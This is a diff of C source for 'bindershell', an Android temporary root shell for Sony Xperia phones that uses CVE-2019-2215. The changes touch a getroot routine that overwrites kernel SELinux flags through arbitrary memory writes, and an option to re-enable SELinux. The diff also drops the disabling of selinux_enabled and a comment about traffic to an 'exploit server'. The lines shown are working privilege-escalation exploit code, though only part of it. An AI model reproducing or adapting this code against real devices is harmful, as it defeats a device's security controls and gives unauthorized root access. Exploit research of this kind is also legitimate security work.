@@ -91,10 +91,6 @@ int getroot(struct offsets* o)
 		return ret;
 	PNFO("task_struct %p\n", task);
 
-	// we need first to disable selinux completely otherwise tcp communication
-	// with our exploit server seems to get denied with user switching to root uid
-	if(o->selinux_enabled)
-		write_at_address_pipe(o->selinux_enabled, &zero, sizeof(zero));
 	if(o->selinux_enforcing)
 		write_at_address_pipe(o->selinux_enforcing, &zero, sizeof(zero));
 
@@ -110,8 +106,6 @@ void reenable_selinux(struct offsets* o)
 {
 	int one = 1;
 
-	if(o->selinux_enabled)
-		write_at_address_pipe(o->selinux_enabled, &one, sizeof(one));
 	if(o->selinux_enforcing)
 		write_at_address_pipe(o->selinux_enforcing, &one, sizeof(one));
 }
@@ -122,8 +116,8 @@ int main(int argc, char **argv)
 	struct offsets* o;
 	int uid;
 
-	PNFO("\nrenoshell - rename/notify temp root shell\n");
-	PNFO("https://github.com/j4nn/renoshell/\n\n");
+	PNFO("\nbindershell - temp root shell for xperia XZ1c/XZ1/XZp using CVE-2019-2215\n");
+	PNFO("https://github.com/j4nn/renoshell/tree/CVE-2019-2215\n\n");
 
 	my_task_name = strrchr(argv[0], '/');
 	if (my_task_name != NULL)
@@ -139,7 +133,7 @@ int main(int argc, char **argv)
 
 	if (argc > 1 && strcmp(argv[1], "--reenable-selinux") == 0) {
 		reenable_selinux(o);
-		PNFO("selinux_enabled and selinux_enforcing set to 1\n");
+		PNFO("selinux_enforcing set to 1\n");
 		return 0;
 	}
 
